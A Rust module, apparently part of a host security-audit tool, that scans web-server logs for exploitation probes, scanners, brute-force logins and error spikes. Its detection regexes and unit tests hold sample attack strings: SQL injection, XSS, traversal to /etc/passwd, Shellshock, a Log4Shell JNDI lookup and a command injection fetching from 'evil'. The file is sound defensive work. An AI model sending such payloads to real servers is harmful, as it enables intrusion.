//! Web-server log analysis.
//!
//! Reads a bounded tail of nginx/Apache access and error logs plus Caddy's structured JSON logs.
//! It detects common exploitation probes, scanner traffic, brute-force patterns and error spikes.
//! The stage only reads logs; it never writes to or rotates them.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::LazyLock;

use regex::Regex;
use serde::Deserialize;
use serde_json::Value;

use crate::audit::StageContext;
use crate::logs;
use crate::report::{Severity, StageId, StageReport, StageStatus};
use crate::text::truncate_with_ellipsis;

const MAX_LOG_FILES: usize = 32;
const MAX_SAMPLES: usize = 3;
const MAX_SAMPLE_CHARS: usize = 240;
const LOGIN_FAILURE_MEDIUM: usize = 10;
const LOGIN_FAILURE_HIGH: usize = 50;
const CLIENT_ERROR_THRESHOLD: usize = 500;
const SERVER_ERROR_THRESHOLD: usize = 25;

const DEFAULT_LOG_ROOTS: [&str; 6] = [
    "/var/log/nginx",
    "/var/log/apache2",
    "/var/log/httpd",
    "/var/log/caddy",
    "/var/log/caddy.log",
    "/var/log/nginx.log",
];

/// Attack/probe classes. The ordering is stable so reports are deterministic.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum Attack {
    SqlInjection,
    Xss,
    PathTraversal,
    CommandInjection,
    Log4Shell,
    Shellshock,
    WebshellProbe,
    SensitiveFileProbe,
    ScannerAgent,
    XmlExternalEntity,
}

impl Attack {
    fn label(self) -> &'static str {
        match self {
            Self::SqlInjection => "SQL injection",
            Self::Xss => "cross-site scripting",
            Self::PathTraversal => "path traversal",
            Self::CommandInjection => "command injection",
            Self::Log4Shell => "Log4Shell/JNDI lookup",
            Self::Shellshock => "Shellshock",
            Self::WebshellProbe => "web shell / upload",
            Self::SensitiveFileProbe => "sensitive file",
            Self::ScannerAgent => "automated scanner",
            Self::XmlExternalEntity => "XML external entity",
        }
    }

    fn severity(self, successful: bool) -> Severity {
        match self {
            Self::ScannerAgent => Severity::Low,
            Self::SensitiveFileProbe if successful => Severity::High,
            Self::SensitiveFileProbe => Severity::Low,
            Self::WebshellProbe if successful => Severity::High,
            Self::WebshellProbe => Severity::Medium,
            _ if successful => Severity::High,
            _ => Severity::Medium,
        }
    }
}

#[derive(Default)]
struct PatternStats {
    count: usize,
    successful: usize,
    samples: Vec<String>,
}

impl PatternStats {
    fn record(&mut self, status: Option<u16>, sample: &str) {
        self.count += 1;
        if status.is_some_and(|code| (200..400).contains(&code)) {
            self.successful += 1;
        }
        if self.samples.len() < MAX_SAMPLES {
            self.samples
                .push(truncate_with_ellipsis(sample, MAX_SAMPLE_CHARS));
        }
    }
}

#[derive(Default)]
struct WebStats {
    requests: usize,
    client_errors: usize,
    server_errors: usize,
    trace_requests: usize,
    attacks: BTreeMap<Attack, PatternStats>,
    login_failures: BTreeMap<String, usize>,
}

impl WebStats {
    fn ingest(&mut self, text: &str) {
        for line in text.lines() {
            let line = line.trim();
            if line.is_empty() {
                continue;
            }
            match parse_request(line) {
                Some(request) => self.record_request(&request),
                None => self.record_raw_line(line),
            }
        }
    }

    fn record_request(&mut self, request: &Request) {
        self.requests += 1;
        if let Some(status) = request.status {
            if (400..500).contains(&status) {
                self.client_errors += 1;
            } else if (500..600).contains(&status) {
                self.server_errors += 1;
            }
        }
        if request.method.eq_ignore_ascii_case("TRACE") {
            self.trace_requests += 1;
        }

        let sample = request.sample();
        for attack in detect(&request.uri, &request.user_agent) {
            self.attacks
                .entry(attack)
                .or_default()
                .record(request.status, &sample);
        }

        if is_login_path(&request.uri)
            && matches!(request.status, Some(401 | 403))
            && let Some(ip) = &request.ip
        {
            *self.login_failures.entry(ip.clone()).or_insert(0) += 1;
        }
    }

    fn record_raw_line(&mut self, line: &str) {
        for attack in detect(line, "") {
            self.attacks.entry(attack).or_default().record(None, line);
        }
    }
}

struct Request {
    ip: Option<String>,
    method: String,
    uri: String,
    status: Option<u16>,
    user_agent: String,
}

impl Request {
    fn sample(&self) -> String {
        format!(
            "{} {} {} -> {}",
            self.ip.as_deref().unwrap_or("-"),
            self.method,
            self.uri,
            self.status
                .map(|status| status.to_string())
                .unwrap_or_else(|| "-".to_owned())
        )
    }
}

pub fn run(ctx: &StageContext<'_>) -> StageReport {
    let roots = if ctx.cfg.web_log_paths.is_empty() {
        DEFAULT_LOG_ROOTS.iter().map(PathBuf::from).collect()
    } else {
        ctx.cfg.web_log_paths.clone()
    };
    let files = logs::collect_files(&roots, is_web_log, MAX_LOG_FILES);
    run_files(ctx, &files)
}

fn run_files(ctx: &StageContext<'_>, files: &[PathBuf]) -> StageReport {
    let mut report = StageReport::new(StageId::Web);
    report.push_header("=== WEB SERVER LOGS ===");

    if files.is_empty() {
        report.push_block(
            "Skipped: no nginx, Apache or Caddy access/error logs found.",
            "Skipped: no web-server logs found.",
        );
        report.note("no web-server logs were found; web log analysis skipped");
        report.finish(Some(StageStatus::Skipped));
        return report;
    }

    let mut stats = WebStats::default();
    let (sources, unreadable) =
        crate::audit::read_log_tails(files, ctx.cfg.log_tail_bytes, |text| stats.ingest(text));

    report.push_header("=== LOG SOURCES ===");
    report.push_block(&sources.join("\n"), "No readable web-server logs.");

    if unreadable > 0 {
        report.finding(
            Severity::Medium,
            format!("{unreadable} web-server log file(s) could not be read"),
        );
    }

    report.push_header("=== SUMMARY ===");
    report.push_block(
        &format!(
            "requests: {}\nclient errors (4xx): {}\nserver errors (5xx): {}\nTRACE requests: {}",
            stats.requests, stats.client_errors, stats.server_errors, stats.trace_requests
        ),
        "No parseable requests.",
    );

    for (attack, pattern) in &stats.attacks {
        let severity = attack.severity(pattern.successful > 0);
        report.finding(
            severity,
            format!(
                "{} pattern: {} request(s), {} with a 2xx/3xx status",
                attack.label(),
                pattern.count,
                pattern.successful
            ),
        );
        if !pattern.samples.is_empty() {
            report.push_block(
                &format!("{}:\n  {}", attack.label(), pattern.samples.join("\n  ")),
                "",
            );
        }
    }

    let login_failures: usize = stats.login_failures.values().sum();
    if login_failures >= LOGIN_FAILURE_MEDIUM {
        let severity = if login_failures >= LOGIN_FAILURE_HIGH {
            Severity::High
        } else {
            Severity::Medium
        };
        report.finding(
            severity,
            format!(
                "web login brute-force pattern: {login_failures} 401/403 response(s); top clients: {}",
                logs::top_counts(&stats.login_failures, 5)
            ),
        );
    }

    if stats.server_errors >= SERVER_ERROR_THRESHOLD {
        report.finding(
            Severity::Medium,
            format!(
                "web server produced {} 5xx response(s); investigate application or proxy failures",
                stats.server_errors
            ),
        );
    }
    if stats.client_errors >= CLIENT_ERROR_THRESHOLD {
        report.finding(
            Severity::Low,
            format!(
                "web server produced {} 4xx response(s); possible scanning or broken clients",
                stats.client_errors
            ),
        );
    }
    if stats.trace_requests > 0 {
        report.finding(
            Severity::Low,
            format!(
                "{} HTTP TRACE request(s) reached the web server; disable the method if unused",
                stats.trace_requests
            ),
        );
    }

    if stats.requests == 0 && stats.attacks.is_empty() {
        report.note("web logs contained no parseable requests or attack patterns");
    } else {
        report.note(format!(
            "analyzed {} web log file(s) and {} request(s)",
            files.len(),
            stats.requests
        ));
    }
    report.finish(None);
    report
}

fn is_web_log(path: &Path) -> bool {
    crate::audit::is_uncompressed_log(path, |name| {
        name.contains("access")
            || name.contains("error")
            || name.contains("caddy")
            || name.ends_with(".log")
    })
}

fn parse_request(line: &str) -> Option<Request> {
    if line.starts_with('{')
        && let Some(request) = parse_caddy(line)
    {
        return Some(request);
    }
    if let Some(captures) = ACCESS_RE.captures(line) {
        return Some(Request {
            ip: captures.name("ip").map(|value| value.as_str().to_owned()),
            method: captures["method"].to_owned(),
            uri: captures["uri"].to_owned(),
            status: captures["status"].parse().ok(),
            user_agent: UA_RE
                .captures(line)
                .map(|captures| captures[1].to_owned())
                .unwrap_or_default(),
        });
    }
    let captures = GENERIC_REQUEST_RE.captures(line)?;
    Some(Request {
        ip: CLIENT_IP_RE
            .captures(line)
            .map(|captures| captures[1].to_owned()),
        method: captures["method"].to_owned(),
        uri: captures["uri"].to_owned(),
        status: None,
        user_agent: String::new(),
    })
}

fn parse_caddy(line: &str) -> Option<Request> {
    let entry: CaddyLine = serde_json::from_str(line).ok()?;
    let request = entry.request?;
    let uri = request.uri?;
    if uri.trim().is_empty() {
        return None;
    }
    Some(Request {
        ip: request.remote_ip,
        method: request.method.unwrap_or_else(|| "GET".to_owned()),
        uri,
        status: entry.status,
        user_agent: request
            .headers
            .as_ref()
            .and_then(|headers| header_value(headers, "user-agent"))
            .unwrap_or_default(),
    })
}

fn header_value(headers: &BTreeMap<String, Value>, wanted: &str) -> Option<String> {
    let value = headers
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(wanted))
        .map(|(_, value)| value)?;
    match value {
        Value::String(text) => Some(text.clone()),
        Value::Array(values) => values.first().and_then(Value::as_str).map(str::to_owned),
        _ => None,
    }
}

fn detect(uri: &str, user_agent: &str) -> Vec<Attack> {
    let mut attacks = ATTACK_PATTERNS
        .iter()
        .filter(|(_, pattern)| pattern.is_match(uri))
        .map(|(attack, _)| *attack)
        .collect::<Vec<_>>();
    if !user_agent.is_empty() && SCANNER_RE.is_match(user_agent) {
        attacks.push(Attack::ScannerAgent);
    }
    attacks.sort_unstable();
    attacks.dedup();
    attacks
}

fn is_login_path(uri: &str) -> bool {
    let uri = uri.to_ascii_lowercase();
    [
        "/login",
        "/signin",
        "/sign-in",
        "/auth",
        "/wp-login",
        "/admin",
        "/session",
    ]
    .iter()
    .any(|path| uri.contains(path))
}

#[derive(Deserialize)]
struct CaddyLine {
    #[serde(default)]
    status: Option<u16>,
    #[serde(default)]
    request: Option<CaddyRequest>,
}

#[derive(Deserialize)]
struct CaddyRequest {
    #[serde(default)]
    remote_ip: Option<String>,
    #[serde(default)]
    method: Option<String>,
    #[serde(default)]
    uri: Option<String>,
    #[serde(default)]
    headers: Option<BTreeMap<String, Value>>,
}

static ACCESS_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"^\s*(?P<ip>\S+) \S+ \S+ \[[^\]]+\]\s+"(?P<method>[A-Z]+)\s+(?P<uri>[^\s"]+)[^"]*"\s+(?P<status>\d{3})"#,
    )
    .expect("valid combined access-log regex")
});

static GENERIC_REQUEST_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#""(?P<method>[A-Z]+)\s+(?P<uri>[^\s"]+)\s+HTTP/[0-9.]+""#)
        .expect("valid generic request regex")
});

static CLIENT_IP_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(?:client|remote_addr|remote_ip)[:=]?\s*\[?(?P<ip>[0-9a-f:.]+)\]?")
        .expect("valid client-ip regex")
});

static UA_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#""([^"]*)"\s*$"#).expect("valid user-agent regex"));

static SCANNER_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)(sqlmap|nikto|nuclei|nmap|masscan|zgrab|gobuster|dirbuster|feroxbuster|wpscan|acunetix|nessus|openvas|hydra|qualys|burp|wfuzz|ffuf|dirsearch|joomscan|whatweb)",
    )
    .expect("valid scanner user-agent regex")
});

/// Each pattern is evaluated against the request target only. Raw error-log lines are passed
/// through the same table, which also catches exploitation attempts recorded by the server.
static ATTACK_PATTERNS: LazyLock<Vec<(Attack, Regex)>> = LazyLock::new(|| {
    vec![
        (
            Attack::SqlInjection,
            Regex::new(
                r"(?i)(union(?:\s|%20)+select|'\s*or\s+'?1'?\s*=\s*'?1|sleep\s*\(|benchmark\s*\(|information_schema|xp_cmdshell|into\s+outfile|load_file\s*\()",
            )
            .expect("valid SQL-injection regex"),
        ),
        (
            Attack::Xss,
            Regex::new(
                r"(?i)(<script|%3cscript|javascript\s*:|onerror\s*=|onload\s*=|document\.cookie|\balert\s*\()",
            )
            .expect("valid XSS regex"),
        ),
        (
            Attack::PathTraversal,
            Regex::new(
                r"(?i)(\.\./|%2e%2e(?:%2f|/)|%252e%252e|/etc/passwd|/proc/self/environ|win\.ini|boot\.ini)",
            )
            .expect("valid path-traversal regex"),
        ),
        (
            Attack::CommandInjection,
            Regex::new(
                r"(?i)(?:;|\||`|\$\(|%3b|%7c)\s*(?:wget|curl|bash|sh|nc|netcat|python|perl|cat|id|whoami|uname|base64|powershell|certutil)\b|/bin/(?:ba)?sh|chmod\s+\+x",
            )
            .expect("valid command-injection regex"),
        ),
        (
            Attack::Log4Shell,
            Regex::new(r"(?i)\$\{(?:jndi|env|sys|lower|date|java):")
                .expect("valid Log4Shell regex"),
        ),
        (
            Attack::Shellshock,
            Regex::new(r"\(\s*\)\s*\{").expect("valid Shellshock regex"),
        ),
        (
            Attack::WebshellProbe,
            Regex::new(
                r"(?i)(/shell\.php|/cmd\.php|/c99\.php|/r57\.php|/eval-stdin\.php|/vendor/phpunit|/wp-content/(?:uploads|plugins)/.*\.php|/uploads/.*\.(?:php|phtml|jsp|asp|aspx)|<\?php|%3c\?php)",
            )
            .expect("valid web-shell regex"),
        ),
        (
            Attack::SensitiveFileProbe,
            Regex::new(
                r"(?i)(/\.env(?:\.|/|$)|/\.git(?:/|$)|/\.svn(?:/|$)|/\.aws/credentials|/wp-login\.php|/wp-admin(?:/|$)|/phpmyadmin|/pma(?:/|$)|/adminer(?:\.php)?|/server-status|/actuator/(?:env|heapdump|health)|/\.DS_Store|/(?:backup|dump|db)\.(?:sql|tar|gz|zip)|/config\.(?:json|php|ya?ml)|/\.?htpasswd|/web\.config|/cgi-bin/)",
            )
            .expect("valid sensitive-file regex"),
        ),
        (
            Attack::XmlExternalEntity,
            Regex::new(r"(?i)(<!doctype|<!entity|%3c!doctype|%3c!entity)")
                .expect("valid XXE regex"),
        ),
    ]
});

#[cfg(test)]
mod tests {
    use super::*;
    use crate::audit::test_support::{
        FakeRunner, finding, finding_message, note, run_stage, write,
    };
    use crate::config::test_config;

    fn run_with_text(text: &str, name: &str) -> StageReport {
        crate::audit::test_support::run_with_file(text, name, |ctx, path| {
            run_files(ctx, std::slice::from_ref(path))
        })
    }

    #[test]
    fn skips_when_no_logs_exist() {
        let report = run_stage(StageId::Web, &FakeRunner::new(&[]), &test_config());
        assert_eq!(report.status, StageStatus::Skipped);
        assert!(note(&report, "web log"));
    }

    #[test]
    fn analyzes_combined_access_logs_and_flags_probes() {
        let text = "\
1.2.3.4 - - [01/Jan/2026:00:00:00 +0000] \"GET /.env HTTP/1.1\" 200 42 \"-\" \"curl/8.0\"
1.2.3.4 - - [01/Jan/2026:00:00:01 +0000] \"GET /index.html HTTP/1.1\" 200 100 \"-\" \"Mozilla/5.0\"
1.2.3.5 - - [01/Jan/2026:00:00:02 +0000] \"GET /?id=1%20UNION%20SELECT%20password FROM users HTTP/1.1\" 403 0 \"-\" \"sqlmap/1.7\"
1.2.3.6 - - [01/Jan/2026:00:00:03 +0000] \"GET /../../etc/passwd HTTP/1.1\" 404 0 \"-\" \"Mozilla/5.0\"
";
        let report = run_with_text(text, "access.log");
        assert_eq!(report.status, StageStatus::Warnings);
        assert!(report.output.contains("sensitive file"));
        assert!(report.output.contains("SQL injection"));
        assert!(report.output.contains("path traversal"));
        assert!(report.output.contains("automated scanner"));
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.severity == Severity::High)
        );
    }

    #[test]
    fn parses_caddy_json_logs() {
        let text = r#"{"level":"info","msg":"handled request","request":{"remote_ip":"10.0.0.1","method":"POST","uri":"/login","headers":{"User-Agent":["Mozilla/5.0"]}},"status":401}
{"level":"info","msg":"handled request","request":{"remote_ip":"10.0.0.1","method":"GET","uri":"/shell.php","headers":{"User-Agent":"curl/8"}},"status":200}
"#;
        let report = run_with_text(text, "caddy.log");
        assert!(report.output.contains("requests: 2"));
        assert!(report.output.contains("web shell / upload"));
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.severity == Severity::High)
        );
    }

    #[test]
    fn flags_brute_force_and_error_spikes() {
        let mut text = String::new();
        for index in 0..12 {
            text.push_str(&format!(
                "10.0.0.{index} - - [01/Jan/2026:00:00:00 +0000] \"POST /login HTTP/1.1\" 401 0 \"-\" \"Mozilla/5.0\"\n"
            ));
        }
        for _ in 0..30 {
            text.push_str(
                "10.0.0.1 - - [01/Jan/2026:00:00:00 +0000] \"GET / HTTP/1.1\" 503 0 \"-\" \"Mozilla/5.0\"\n",
            );
        }
        let report = run_with_text(&text, "access.log");
        assert!(finding_message(&report, "brute-force"));
        assert!(finding_message(&report, "5xx"));
    }

    #[test]
    fn flags_client_error_spikes_and_trace_requests() {
        let mut text = String::new();
        for _ in 0..501 {
            text.push_str(
                "10.0.0.1 - - [01/Jan/2026:00:00:00 +0000] \"GET /missing HTTP/1.1\" 404 0 \"-\" \"Mozilla/5.0\"\n",
            );
        }
        text.push_str(
            "10.0.0.1 - - [01/Jan/2026:00:00:00 +0000] \"TRACE / HTTP/1.1\" 200 0 \"-\" \"Mozilla/5.0\"\n",
        );
        let report = run_with_text(&text, "access.log");
        assert!(finding_message(&report, "4xx"));
        assert!(finding_message(&report, "TRACE"));
    }

    #[test]
    fn scans_error_logs_for_exploitation_attempts() {
        let text = "\
2026/01/01 00:00:00 [error] 1#1: *2 client: 1.2.3.4, server: example, request: \"GET //etc/passwd HTTP/1.1\", host: \"example\"
";
        let report = run_with_text(text, "error.log");
        assert!(report.output.contains("path traversal"));
    }

    #[test]
    fn caddy_header_values_may_be_non_strings() {
        let text = "{\"request\":{\"uri\":\"/\",\"headers\":{\"User-Agent\":42}},\"status\":200}\n";
        let report = run_with_text(text, "caddy.log");
        assert!(report.output.contains("requests: 1"));
        assert!(report.findings.is_empty());
    }

    #[test]
    fn raw_error_lines_and_empty_caddy_uris_are_handled() {
        let text = "worker process probe /shell.php\n\
                    {\"request\":{\"uri\":\"   \"},\"status\":200}\n\n";
        let report = run_with_text(text, "error.log");
        assert!(report.output.contains("web shell / upload"));
        assert!(report.output.contains("requests: 0"));
    }

    #[test]
    fn custom_web_log_paths_are_used() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("access.log");
        write(
            &path,
            "1.2.3.4 - - [01/Jan/2026:00:00:00 +0000] \"GET / HTTP/1.1\" 200 1 \"-\" \"Mozilla/5.0\"\n",
        );
        let mut cfg = test_config();
        cfg.web_log_paths = vec![path];
        let report = run_stage(StageId::Web, &FakeRunner::new(&[]), &cfg);
        assert!(report.output.contains("access.log"));
        assert_eq!(report.status, StageStatus::Passed);
    }

    #[test]
    fn labels_and_severities_cover_every_attack() {
        for attack in [
            Attack::SqlInjection,
            Attack::Xss,
            Attack::PathTraversal,
            Attack::CommandInjection,
            Attack::Log4Shell,
            Attack::Shellshock,
            Attack::WebshellProbe,
            Attack::SensitiveFileProbe,
            Attack::ScannerAgent,
            Attack::XmlExternalEntity,
        ] {
            assert!(!attack.label().is_empty());
        }
        assert_eq!(Attack::ScannerAgent.severity(true), Severity::Low);
        assert_eq!(Attack::SensitiveFileProbe.severity(true), Severity::High);
        assert_eq!(Attack::SensitiveFileProbe.severity(false), Severity::Low);
        assert_eq!(Attack::WebshellProbe.severity(true), Severity::High);
        assert_eq!(Attack::WebshellProbe.severity(false), Severity::Medium);
        assert_eq!(Attack::Xss.severity(true), Severity::High);
        assert_eq!(Attack::Xss.severity(false), Severity::Medium);
    }

    #[test]
    fn high_volume_login_failures_are_high_severity() {
        let mut text = String::new();
        for _ in 0..50 {
            text.push_str(
                "10.0.0.1 - - [01/Jan/2026:00:00:00 +0000] \"POST /login HTTP/1.1\" 401 0 \"-\" \"Mozilla/5.0\"\n",
            );
        }
        let report = run_with_text(&text, "access.log");
        assert!(finding(&report, Severity::High, "web login brute-force"));
    }

    #[test]
    fn clean_logs_pass_without_findings() {
        let text = "\
1.2.3.4 - - [01/Jan/2026:00:00:00 +0000] \"GET / HTTP/1.1\" 200 42 \"-\" \"Mozilla/5.0\"
";
        let report = run_with_text(text, "access.log");
        assert_eq!(report.status, StageStatus::Passed);
        assert!(report.findings.is_empty());
    }

    #[test]
    fn unreadable_logs_are_reported() {
        let runner = FakeRunner::new(&[]);
        let ui = crate::test_support::ui();
        let cfg = test_config();
        let ctx = crate::audit::test_support::stage_context(&cfg, &runner, &ui);
        let report = run_files(&ctx, &[PathBuf::from("/definitely/not/a/log")]);
        assert!(finding_message(&report, "could not be read"));
    }

    #[test]
    fn detection_covers_common_payloads() {
        for (uri, expected) in [
            ("/x?q=UNION%20SELECT", Attack::SqlInjection),
            ("/%3Cscript%3E", Attack::Xss),
            ("/../../etc/passwd", Attack::PathTraversal),
            ("/x?;wget+http://evil", Attack::CommandInjection),
            ("/${jndi:ldap://evil/a}", Attack::Log4Shell),
            ("/() { :; }; /bin/sh", Attack::Shellshock),
            ("/shell.php", Attack::WebshellProbe),
            ("/index.php?code=%3C?php", Attack::WebshellProbe),
            ("/x?q=%3C!DOCTYPE", Attack::XmlExternalEntity),
            ("/.git/config", Attack::SensitiveFileProbe),
        ] {
            assert!(detect(uri, "").contains(&expected), "{uri}");
        }
        assert!(detect("/", "sqlmap/1.7").contains(&Attack::ScannerAgent));
    }

    #[test]
    fn is_web_log_ignores_compressed_and_unrelated_files() {
        assert!(is_web_log(Path::new("/var/log/nginx/access.log")));
        assert!(is_web_log(Path::new("/var/log/caddy/access.log.1")));
        assert!(!is_web_log(Path::new("/var/log/nginx/access.log.gz")));
        assert!(!is_web_log(Path::new("/var/log/nginx/other.txt")));
    }
}
